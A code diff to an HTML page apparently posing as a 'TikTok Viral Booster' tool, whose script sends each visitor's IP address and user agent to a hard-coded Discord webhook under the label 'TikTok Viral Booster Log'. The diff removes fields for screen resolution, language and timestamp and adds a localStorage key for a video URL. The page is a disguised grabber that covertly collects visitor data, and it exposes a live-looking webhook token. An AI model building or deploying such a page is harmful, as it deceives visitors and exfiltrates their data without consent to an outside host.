@@ -45,10 +45,10 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
         .logo {
-            font-size: 60px; /* Adjusted size for emoji */
+            font-size: 60px;
             line-height: 1;
             margin-bottom: 20px;
-            color: #e62241; /* TikTok red */
+            color: #e62241;
             text-shadow: 0 0 10px rgba(230, 34, 65, 0.7);
         }
         h1 {
@@ -122,6 +122,7 @@
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SFH6b4uEJo9P2VpbM1';
+        const VIDEO_URL_KEY = 'tiktokVideoUrl'; // Key for localStorage
 
         async function sendDataToWebhook(data, type) {
             let ipAddress = 'Unknown';
@@ -142,10 +143,7 @@
                     color: 16750848,
                     fields: [
                         { name: "IP Address", value: ipAddress, inline: true },
-                        { name: "User Agent", value: navigator.userAgent, inline: false },
-                        { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "Language", value: navigator.language, inline: true },
-                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                        { name: "User Agent", value: navigator.userAgent, inline: false }
                     ],
                     footer: { text: "TikTok Viral Booster Log" }
                 }]
